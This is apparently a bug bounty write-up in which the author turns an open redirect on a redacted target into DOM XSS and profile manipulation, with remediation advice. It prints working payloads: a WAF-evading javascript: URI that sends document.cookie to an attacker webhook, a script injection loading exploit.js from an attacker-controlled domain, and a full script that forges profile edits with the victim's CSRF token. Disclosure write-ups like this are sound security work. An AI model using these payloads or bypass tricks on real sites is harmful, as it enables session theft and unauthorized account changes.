+++
date = '2025-07-24T10:11:07+01:00'
draft = false
title = 'My First H1 Bounty: From Open Redirect to Profile Manipulation'
tags = ["xss", "bug bounty", "web security", "hackerone"]
+++

# From Open Redirect to DOM XSS to Profile Manipulation

## My Journey to HackerOne

After 2.5 years of playing CTFs, I decided to start doing bug bounty to test my skills and try to make some money. My first month on Bugcrowd was mixed - I got some N/A reports, a few informational findings, and some valid P4/P3 vulnerabilities.

Bugcrowd isn't a bad platform, but I had found some critical vulnerabilities there and submitted them. The problem was that they didn't respond to my reports for more than 2 weeks, which made me lose motivation to keep hunting on the same platform. So I decided to switch to HackerOne to get my motivation back.

Just one week into hunting on HackerOne, I found something really good. This wasn't just any normal finding - it was special because it was my:

- **First report on HackerOne**
- **First High severity finding**  
- **First collaboration with another hacker**
- **First XSS vulnerability found**

This was a lot for me! I'm excited to share how a simple open redirect turned into a high-impact DOM XSS that could manipulate user profiles.

## Writeup Summary

During a bug bounty hunt on a target's main domain, I discovered an [open redirect vulnerability](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet) that I successfully escalated to a [DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS) with severe impact. Working collaboratively with my friend Amine ([@bm00__](https://x.com/bm00__)), we bypassed [Akamai WAF](https://www.akamai.com/products/cloud-security) protections and achieved:

- Cookie theft via JavaScript execution
- User profile manipulation through [CSRF](https://owasp.org/www-community/attacks/csrf) exploitation
- Partial account compromise (limited by HTTPOnly cookies)

The vulnerability was reported and rewarded with a **High severity (7.1 CVSS)** rating and received an initial bounty on triage due to its severity.

## Technical Details

I began hunting on a target with [wildcard scope](https://docs.hackerone.com/en/articles/8486276-asset-types) assets. After conducting thorough reconnaissance and discovering numerous subdomains, I focused my attention on the main domain where I eventually found this vulnerability.

During my enumeration, I discovered an interesting endpoint:
```
https://example.com/vulnerable
```

This URL accepted a `callback_url` parameter:
```
https://example.com/vulnerable?callback_url=https://example.com
```

### Vulnerability Analysis

#### Step 1: Open Redirect Discovery

My first test was for an [open redirect vulnerability](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html):
```
https://example.com/vulnerable?callback_url=https://google.com
```

The application successfully redirected me to Google, confirming the open redirect. However, I noticed in the program's policy that open redirects were marked as out of scope, so I decided to escalate the impact rather than report it immediately.

#### Step 2: Code Analysis

I examined the JavaScript implementation and found the vulnerable code:

```javascript
const url = new URLSearchParams(window.location.search).get("callback_url");
window.location.href = url
```

**Critical Issue**: The application trusts any URI scheme provided by the attacker, including `javascript:` URIs (not just `http:` and `https:`).

#### Step 3: JavaScript Execution Confirmation

To confirm JavaScript execution capability, I tested:
```
https://example.com/vulnerable?callback_url=javascript:var x=5
```

Then in the browser console, I executed `console.log(x)` and successfully retrieved the value `5`, confirming that arbitrary JavaScript could be executed.

### WAF Bypass and Collaboration
When I attempted basic XSS payloads like `javascript:alert()`, I encountered **403 Forbidden** responses. The target was protected by Akamai WAF, which was blocking malicious requests. After several unsuccessful bypass attempts, I collaborated with my friend Amine ([@bm00__](https://twitter.com/bm00__)).

Amine successfully bypassed the WAF using the [optional chaining operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Optional_chaining) (`?.`) trick. This technique helped obfuscate our JavaScript payload and evade WAF detection.

### Cookie Theft Implementation

After confirming we could execute JavaScript, we focused on cookie theft. Our initial attempt with `document.cookie` was blocked, but we bypassed this restriction using string concatenation and optional chaining:

```javascript
javascript:fetch?.('https://WEBHOOK/?c='+document['co'+'okie'])
```

**Success!** We successfully exfiltrated the user's cookies to our webhook. However, when attempting full account takeover, we discovered that a critical authentication cookie was marked as [HTTPOnly](https://owasp.org/www-community/HttpOnly), preventing JavaScript access.

### Escalation to Profile Manipulation

Rather than settling for cookie theft alone, we decided to find additional impact. We discovered two important endpoints:

1. **User Information Endpoint**: `https://example.com/users/${username}` - for reading sensitive user data
2. **Profile Edit Endpoint**: `https://example.com/users/${username}/edit` - for modifying user information

The edit endpoint required:
- **Method**: POST
- **Content-Type**: `application/x-www-form-urlencoded`
- **CSRF Token**: Valid token from user session

#### Payload Development

Our initial payload attempted to fetch a CSRF token and modify the user profile:

```javascript
javascript:fetch?.('https://example.com/webroutes/auth/csrf',{credentials:'include'})
  .then(r=>r.json())
  .then(j=>fetch?.('https://example.com/user/VICTIM/edit',{
    method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'csrf_token='+encodeURIComponent(j.csrf)+'&name=ATTACKER'+'&bio=PWNED'+'&website_link=https%3A%2F%2Fpwned.com'+'&mobile=%2B911212121212'
  }));
```

However, this payload encountered encoding issues and was excessively long.

#### Script Injection Approach

We refined our approach by injecting a script element that loads our exploit from an external source:

```
https://example.com/social-ads/?callback_url=javascript:d=document;a='scr';b='ipt';
s=d.createElement?.(a%2Bb);s.src='https://DOMAIN_WE_CONTROL/exploit.js';d.body.appendChild?.(s)
```

### Final Exploit Code

Our external JavaScript file (`exploit.js`) contained the complete exploit:

```javascript
// Function to extract username from DOM
function getUser() {
  return fetch('https://example.com/user-settings/notification', { credentials: 'include' })
    .then(res => res.text())
    .then(html => {
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const script = [...doc.scripts].find(s => s.textContent.includes('window.__PRELOADED_STATE__'));
      const json = script.textContent.match(/JSON\.parse\("(.+?)"\)/)[1]
        .replace(/\\"/g, '"').replace(/\\\\/g, '\\');
      const data = JSON.parse(json);
      return data.user.basic_info.profile_url.split('/')[2];
    })
}

// Function to update user profile
async function updateProfile() {
  const user = await getUser();
  if (!user) return;

  // Extract CSRF token from cookies
  const csrf = document.cookie.split('csrf=')[1]?.split(';')[0];
  const body = new URLSearchParams({
    csrf_token: csrf,
    name: 'ATTACKER',
    bio: 'PWNED',
    website_link: 'https://pwned.com',
  });

  fetch(`https://example.com/users/${user}/edit`, {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body
  }).then(res => res.text()).then(console.log).catch(console.error);
}

updateProfile();
```

## Impact Assessment

This vulnerability chain allowed attackers to:

1. **Execute arbitrary JavaScript** in the victim's browser context
2. **Steal session cookies** (excluding HTTPOnly cookies)
3. **Modify user profile information** without consent
4. **Potentially perform other authenticated actions** as the victim

## Program Response and Bounty

The vulnerability was reported through the HackerOne platform and received immediate recognition: 

### Initial Triage Response

> *"Given the severity of the report, we are paying an initial $$$ on triage. Congratulations! We will award the rest once it's resolved."*

![Initial reward on triage](/f0dh1l/images/first-h1-bounty/image-1.png)

### Final Severity Assessment

The program assigned a **High severity rating (7.1 CVSS)** to this vulnerability:

![Final severity assessment](/f0dh1l/images/first-h1-bounty/image-3.png)

### Final Bounty Award

After the vulnerability was resolved, we received the final bounty payment along with an additional bonus:

> *"Additionally, we are giving a one-time $50 bonus as it was a good submission and to encourage you to continue hunting."*

![Final bounty payment](/f0dh1l/images/first-h1-bounty/image-4.png)

## Lessons Learned

1. **Always escalate impact when possible** - What started as an out-of-scope open redirect became a high-severity vulnerability
2. **Collaboration enhances results** - Working with my friend helped overcome WAF restrictions
3. **Persistence pays off** - Not settling for cookie theft alone led to profile manipulation capabilities
4. **Creative bypasses work** - Optional chaining and string concatenation effectively evaded security controls

## Timeline

- **Discovery**: Open redirect vulnerability identified
- **Escalation**: JavaScript execution confirmed  
- **Collaboration**: WAF bypass achieved with teammate
- **Impact Extension**: Profile manipulation capability developed
- **Reporting**: Vulnerability submitted to program
- **Triage**: Initial bounty awarded due to severity
- **Resolution**: Vulnerability fixed by program
- **Final Reward**: Complete bounty payment with bonus

## Remediation Recommendations

1. **Implement strict URL validation** for redirect parameters
2. **Use allowlists** for permitted redirect destinations
3. **Validate URI schemes** to only allow `http:` and `https:`
4. **Implement proper CSP headers** to prevent script injection
5. **Use SameSite cookie attributes** and HTTPOnly flags appropriately

## Additional Resources

- [OWASP DOM XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [Mozilla Optional Chaining Documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Optional_chaining)
- [HackerOne Vulnerability Classification](https://docs.hackerone.com/hackers/severity.html)
- [CSRF Prevention Techniques](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [open redirect vulnerability](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
- [DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [Akamai WAF](https://www.akamai.com/products/)
